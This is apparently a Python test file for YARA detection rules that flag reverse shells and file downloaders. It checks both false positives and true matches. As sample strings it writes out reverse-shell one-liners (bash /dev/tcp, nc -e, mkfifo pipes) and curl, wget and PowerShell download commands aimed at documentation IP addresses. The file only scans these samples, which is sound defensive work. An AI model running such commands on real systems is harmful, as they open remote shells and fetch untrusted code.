"""The behaviour rules in rules.yar, run through the real yara binary. Each rule
is tested both ways, because tightening one is only worth anything if it still
catches what it is for. Samples are short strings that are written to a temp
file and only ever scanned; nothing here is run. Skipped if yara is not installed.
"""
import os
import shutil
import subprocess
import tempfile
import unittest

RULES = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rules.yar")


@unittest.skipUnless(shutil.which("yara"), "yara is not installed")
class RuleTestCase(unittest.TestCase):
    rule = None

    def fires(self, content, encoding="utf-8"):
        """encoding "utf-16" writes a byte-order mark, "utf-16-le" does not:
        Windows PowerShell saves scripts both ways."""
        with tempfile.NamedTemporaryFile("wb", suffix=".txt", delete=False) as handle:
            handle.write(content.encode(encoding))
        self.addCleanup(os.unlink, handle.name)
        result = subprocess.run(["yara", RULES, handle.name], capture_output=True, text=True, timeout=60)
        self.assertEqual(result.returncode, 0, result.stderr)
        return any(line.split()[0] == self.rule for line in result.stdout.splitlines())

    def assert_fires(self, *samples):
        """Every positive sample must also fire saved as UTF-16, with and
        without a byte-order mark. Without `ascii wide` on the rule strings,
        a script saved that way matched none of them."""
        for sample in samples:
            for encoding in ("utf-8", "utf-16", "utf-16-le"):
                self.assertTrue(self.fires(sample, encoding), f"{encoding}: {sample}")

    def assert_quiet(self, *samples):
        for sample in samples:
            for encoding in ("utf-8", "utf-16", "utf-16-le"):
                self.assertFalse(self.fires(sample, encoding), f"{encoding}: {sample}")


class ReverseShellRule(RuleTestCase):
    rule = "detect_reverse_shell"

    def test_script_header_is_not_a_reverse_shell(self):
        self.assert_quiet("#!/bin/bash -i\n\nset -e\necho hello\n",
                          "#!/bin/sh -i\necho hello\n",
                          "#! /bin/bash -i\necho hello\n",
                          "#!/bin/bash\necho hello\n")

    def test_real_patterns_still_fire(self):
        self.assert_fires("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n",
                          "nc -e /bin/sh 192.0.2.1 4444\n",
                          "nc -e /bin/bash 192.0.2.1 4444\n",
                          "os.dup2(s.fileno(),0)\n",
                          'pty.spawn("/bin/bash")\n',
                          "pty.spawn('/bin/sh')\n",
                          "mkfifo f; cat f | /bin/sh -i 2>&1 | nc 192.0.2.1 4444 > f\n",
                          "exec /bin/bash -i\n",
                          "/bin/bash -i\n")

    def test_header_does_not_hide_the_real_thing(self):
        self.assert_fires("#!/bin/bash -i\nmkfifo f; cat f | /bin/bash -i 2>&1 | nc 192.0.2.1 4444 > f\n",
                          "#!/bin/bash -i\nnc -e /bin/sh 192.0.2.1 4444\n")


class DownloaderRule(RuleTestCase):
    rule = "detect_downloader"

    def test_emoji_names_are_not_downloads(self):
        self.assert_quiet(".emoji.curl,.cmd .prompt { color: red }\n",
                          ".emoji.curling_stone,.cmd .prompt { color: red }\n",
                          ".emoji.curly_loop,.cmd .prompt { color: red }\n")

    def test_function_names_are_not_downloads(self):
        self.assert_quiet("func fetchWorkers() tea.Cmd {\n",
                          "Fetches syscall stubs from the on-disk ntdll.dll \n",
                          "Invoke-DownloadFile.ps1\n")

    def test_words_containing_a_keyword_do_not_count(self):
        self.assert_quiet("prefetch('a') and later setup.exe \n",
                          "wgetrc points at install.sh \n",
                          "curling club notes in minutes.bat \n")

    def test_real_downloads_still_fire(self):
        self.assert_fires("curl -o a.sh http://198.51.100.1/a.sh \n",
                          "CURL -O http://198.51.100.1/a.exe \n",
                          "wget -nv http://198.51.100.1/a.msi \n",
                          "wget\thttp://198.51.100.1/a.sh \n",
                          "urlretrieve('http://198.51.100.1/a.exe', 'a.exe')\n",
                          "urllib.request.urlopen('http://198.51.100.1/a.ps1')\n",
                          "requests.get('http://198.51.100.1/a.jar')\n",
                          "(New-Object Net.WebClient).DownloadFile('http://198.51.100.1/a.exe','a.exe')\n",
                          "Invoke-WebRequest -Uri http://198.51.100.1/a.ps1 \n",
                          "iwr http://198.51.100.1/a.ps1 \n",
                          "fetch('http://198.51.100.1/a.sh')\n",
                          "$(curl -s http://198.51.100.1/a.sh) \n",
                          "curl.exe -s http://198.51.100.1/a.exe -o a.exe \n",
                          "wget.exe http://198.51.100.1/a.ps1 \n",
                          'subprocess.run(["curl", "-o", "a.sh", "http://198.51.100.1/a.sh"])\n',
                          'subprocess.run(["wget", "http://198.51.100.1/a.sh"])\n')


if __name__ == "__main__":
    unittest.main()
